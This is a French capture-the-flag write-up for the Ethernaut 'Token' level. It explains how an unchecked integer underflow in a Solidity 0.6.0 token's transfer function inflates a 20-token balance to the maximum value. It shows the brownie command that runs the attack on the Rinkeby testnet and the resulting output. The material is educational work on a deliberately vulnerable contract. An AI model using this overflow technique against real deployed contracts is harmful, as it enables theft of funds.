# Token

## Objectif
L'objectif de ce niveau et de récupérer un maximum de token en partant de 20 tokens

## Récupération de token
La seule fonction du contract permettant de récupérer des tokens est [transfer](contracts/token.sol#13)

Le contrat utilise [solidity 0.6.0](contracts/token.sol#2) qui est sujet au overflow.

En envoyant une demande de transfer avec un montant supérieur à la `balance`, un [overflow](contracts/token.sol#15) va avoir lieu et ainsi rajouter des tokens à la `balance`

## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run scripts/attack.py main "0xB573cBF16170c087DC3fF81d49B2E2106550859d" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

TokenProject is the active project.

Running 'scripts/attack.py::main'...
Balance before: 20
Transaction sent: 0x6f079cf8d56c170fe3ac28cc2dec09b1a0e1c1c176a66b975a134ac74ce82e66
  Gas price: 1.135137131 gwei   Gas limit: 54220   Nonce: 226
  Transaction confirmed   Block: 10335310   Gas used: 49291 (90.91%)

Required confirmations: 2/2  
  Transaction confirmed   Block: 10335310   Gas used: 49291 (90.91%)

Balance after: 115792089237316195423570985008687907853269984665640564039457584007913129639935
```
